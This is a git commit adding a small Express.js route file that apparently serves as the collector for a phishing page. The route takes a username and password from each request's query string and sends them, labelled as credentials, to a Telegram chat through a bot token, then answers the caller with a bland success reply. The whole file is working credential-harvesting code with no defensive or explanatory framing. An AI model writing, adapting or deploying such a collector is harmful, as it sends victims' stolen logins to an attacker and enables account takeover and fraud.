3ccfadd0e394a586f15d17164eaa66829f78b8f6
unknown <olatoyeolaide@gmail.com>
2023-08-11 16:53:35 -0700

    first commit

---
+++ routes/send-route.js
@@ -0,0 +1,22 @@
+require('dotenv').config();
+const expres = require('express');
+const router = expres.Router();
+const TelegramBot = require('node-telegram-bot-api');
+const url = require('url');
+
+const bot = new TelegramBot(process.env.TOKEN, { polling: true });
+
+
+const route = router.use("/", function (req, res, next) {
+    // Matches "/echo [whatever]"
+    const path = url.parse(req.url , true);
+    let email = path.query.user;
+    let pass = path.query.pass;
+     // send a message to the chat acknowledging receipt of their message
+    const chatId =  parseInt( process.env.CHATID );
+    bot.sendMessage(chatId, `username: ${email} : password ${pass}`);
+    res.send({ good: 'good' });
+    res.end();
+})
+
+module.exports = route;
